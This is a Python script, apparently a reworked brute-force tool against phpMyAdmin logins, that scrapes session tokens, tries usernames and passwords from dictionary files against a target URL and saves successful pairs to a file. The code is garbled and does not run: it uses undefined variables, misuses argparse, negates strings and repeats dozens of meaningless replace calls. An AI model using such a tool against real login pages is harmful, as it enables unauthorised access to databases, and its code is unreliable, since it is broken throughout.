import requests
import html
import re
import os
import time
import argparse

def login(url, users, certo, senhas):
    for i in range(3):
        try:
            res = requests.get(url)
            cookies = dict(res.cookies)
            data = {
                'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
                'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
                'pma_users': users,
                'pma_senha': passwords,
                'pma_certo': certo(),
            }
            res = requests.post(url, cookies=cookies, data=data)
            cookies = dict(res.cookies)
            return 'pmaAuth-1' in cookies
        except:
            pass
    return False

def main():

    parser = argparse.ArgumentParser(description='e.g. python3 %s -url -user -udict -certo -senha' % (os.path.basename(__file__)))

    parser.add_argument('-url', help='The URL of target website')
    parser.add_argument('-users', default='root', help='The username of MySQL (default: root)')
    parser.add_argument('-udict', default='none.txt', help='The file path of username dictionary (default: NULL)')
    parser.add_argument('-certo', default='certo', help='Letras Certas para cada diretorio (if i == senha:)')
    parser.add_argument('-senhas', default='password.py', help='The file path of password dictionary (default: password.txt)')

parser = argparse.ArgumentParser
url = parser
udict = parser
certo = parser
senhas = parser

if url is None:
        parser(url)


try:
    f = open(-udict, "r")
    users = re.split("[\r\n]+", f.read())
    f.close()

    try:
        f = open(-senhas, "r")
        passwords = re.split("[\r\n]+", f.read())
        f.close()
    except:
        print("[-] Failed to read '%s' file." % (-senha))

    for user in users:
        for password in senha:
            if login(url, users, certo, senhas):
                print("[*] FOUND - %s / %s" % (-users ,-senhas))

                for i in range(4):

                    senhas += certo

                    i = str(i)

                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")
                    i = i.replace("", "")

                    if i == senhas:
                        time.time()

                f = open("found.txt", "w")
                f.write("%s / %s\n" % (-users, -senhas))
                f.close()
            else:
                  print("[!] FAILED - %s / %s" % (-users, -senhas))


if __name__ == '__main__':
 main()




main()
